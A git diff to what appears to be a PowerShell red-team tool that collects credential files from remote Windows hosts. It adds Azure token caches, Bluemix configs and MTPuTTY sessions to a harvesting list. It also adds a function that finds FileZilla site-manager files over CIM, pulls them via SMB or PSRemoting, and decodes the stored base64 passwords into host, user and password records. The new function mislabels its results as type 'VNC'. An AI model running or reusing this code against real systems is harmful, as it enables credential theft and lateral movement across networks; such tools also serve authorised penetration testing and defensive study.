@@ -97,17 +97,25 @@ function Get-CredentialFile {
             "AWS-KeyFile"               = "\.aws\credentials"
             "Azure-Tokens"              = "\.azure\accessTokens.json"
             "Azure-Profile"             = "\.azure\azureProfile.json"
+            "Azure-TokenCache"          = "\.azure\TokenCache.dat"
+            "Azure-TokenCache2"         = "\AppData\Roaming\Windows Azure Powershell\TokenCache.dat"
+            "Azure-RMContext"           = "\.azure\AzureRMContext.json"
+            "Azure-RMContext2"          = "\AppData\Roaming\Windows Azure Powershell\AzureRMContext.json"
             "GCP-LegacyCreds"           = "\AppData\Roaming\gcloud\legacy_credentials"
             "GCP-CredsDb"               = "\AppData\Roaming\gcloud\credentials.db"
             "GCP-AccessTokensDb"        = "\AppData\Roaming\gcloud\access_tokens.db"
+            "Bluemix-Config"            = "\.bluemix\config.json"
+            "Bluemix-Config2"           = "\.bluemix\.cf\config.json"
             # Sessions
             "SuperPutty-Sessions"       = "\Documents\SuperPuTTY\Sessions.xml"
-            "FileZilla-SavedSessions"   = "\AppData\Roaming\FileZilla\sitemanager.xml"
-            "FileZilla-RecentSessions"  = "\AppData\Roaming\FileZilla\recentservers.xml"
+            "MTPuTTy-Sessions"          = "\AppData\Roaming\TTYPlus\mtputty.xml"
         }
 
         Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
             $profilePath = $_.LocalPath
+
+            Get-FilezillaCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$Download -Credential $Credential -PSSession $psSession
+
             foreach ($userFile in $userFiles.GetEnumerator()) {
                 $filePath = ($_.LocalPath + $userFile.Value) -replace '\\','\\'
                 $filter  = "Name='$filePath'"
@@ -230,7 +238,7 @@ function Local:Get-VncCredentialFile {
                     else {
                         Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                     }
-
+                    # Extract credentials from file
                     $creds = New-Object -TypeName psobject
                     $reader = New-Object System.IO.StreamReader($outputFile)
                     while (($line = $reader.ReadLine()) -ne $null) {
@@ -256,6 +264,99 @@ function Local:Get-VncCredentialFile {
 
     END {}
 }
+
+function Local:Get-FilezillaCredentialFile {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [string]
+        $ProfilePath,
+
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession,
+
+        [Switch]
+        $Download,
+
+        [Management.Automation.Runspaces.PSSession]
+        $PSSession,
+
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]
+        $Credential = [System.Management.Automation.PSCredential]::Empty
+    )
+
+    BEGIN {
+        $ComputerName = $CimSession.ComputerName
+    }
+
+    PROCESS {
+        $userFiles = @(
+            "\AppData\Roaming\FileZilla\sitemanager.xml"
+            "\AppData\Roaming\FileZilla\recentservers.xml"
+        )
+
+        foreach ($userFile in $userFiles) {
+            $filePath = ($ProfilePath + $userFile) -replace '\\','\\'
+            $filter  = "Name='$filePath'"
+            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
+            if ($file.Name) {
+                $obj = New-Object -TypeName psobject
+                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
+                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
+                $obj | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
+                $obj | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
+
+                if ($Download) {
+                    $outputDir = "$PWD\$ComputerName"
+                    $temp = $file.Name -split '\\'
+                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))"
+                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
+                    if ($PSSession) {
+                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $PSSession
+                    }
+                    else {
+                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
+                    }
+                    # Extract credentials from file
+                    $creds = New-Object System.Collections.ArrayList
+                    $xml = [Xml] (Get-Content $outputFile)
+                    if (-not ($sessions = $xml.SelectNodes('//FileZilla3/Servers/Server')).Count) {
+                        $sessions = $xml.SelectNodes('//FileZilla3/RecentServers/Server')
+                    }
+                    foreach($session in $sessions) {
+                        $cred = @{}
+                        $session.ChildNodes | ForEach-Object {
+                            if ($_.InnerText) {
+                                if ($_.Name -eq "Pass") {
+                                    if ($_.Attributes["encoding"].Value -eq "base64") {
+                                        $cred["Password"] = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($_.InnerText))
+                                    }
+                                    else {
+                                        $cred["Password"] = $_.InnerText
+                                    }
+                                }
+                                else {
+                                    $cred[$_.Name] = $_.InnerText
+                                }
+                            }
+                        }
+                        if ($cred.Password) {
+                            $creds.Add((New-Object PSObject -Property $cred | Select-Object -Property Host,Port,User,Password)) | Out-Null
+                        }
+                    }
+                }
+                $obj | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
+                Write-Output $obj
+            }
+        }
+    }
+
+    END {}
+}
+
 
 function Local:Get-RemoteFile {
     [CmdletBinding()]
